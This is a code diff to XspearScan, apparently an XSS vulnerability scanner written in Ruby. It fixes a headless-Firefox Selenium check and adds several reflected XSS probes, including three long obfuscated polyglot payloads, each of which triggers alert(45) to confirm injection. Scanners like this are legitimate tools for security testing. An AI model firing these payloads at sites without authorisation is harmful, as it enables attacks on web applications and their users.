@@ -58,27 +58,32 @@ class XspearScan
 
   class CallbackXSSSelenium < ScanCallbackFunc
     def run
+      begin
       options = Selenium::WebDriver::Firefox::Options.new(args: ['-headless'])
       driver = Selenium::WebDriver.for(:firefox, options: options)
       if @method == "GET"
         begin
-          driver.get(@url)
+          driver.get(@url+"?"+@query)
           alert = driver.switch_to().alert()
           if alert.text.to_s == "45"
             driver.quit
-            [true, "found alert/prompt/confirm (45) in selenium!! #{@query}\n               => "]
+            return [true, "found alert/prompt/confirm (45) in selenium!! #{@query}\n               => "]
           else
             driver.quit
-            [true, "found alert/prompt/confirm event in selenium #{@query}\n               =>"]
+            return [true, "found alert/prompt/confirm event in selenium #{@query}\n               =>"]
           end
         rescue Selenium::WebDriver::Error::UnexpectedAlertOpenError => e
           driver.quit
-          [true, "found alert/prompt/confirm error base in selenium #{@query}\n               =>"]
+          return [true, "found alert/prompt/confirm error base in selenium #{@query}\n               =>"]
         rescue => e
+          p e
           driver.quit
-          [false, "not found alert/prompt/confirm event #{@query}\n               =>"]
+          return [false, "not found alert/prompt/confirm event #{@query}\n               =>"]
         end
       end
+    rescue => e
+      puts e
+    end
     end
   end
 
@@ -110,7 +115,11 @@ class XspearScan
     r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<svg/onload=alert(45)>', '<svg/onload=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<img/src onerror=alert(45)>', '<img/src onerror=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
-    r.push makeQueryPattern('x', '<script>alert(45)</script>', '<script>alert(45)</script>', 'h', "injected "+"<script>alert(45)</script>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "injected "+"<script>alert(45)</script>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "injected "+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "running "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "running "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "running "+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r = r.flatten
     r = r.flatten
     log('s', "test query generation is complete. [#{r.length} query]")
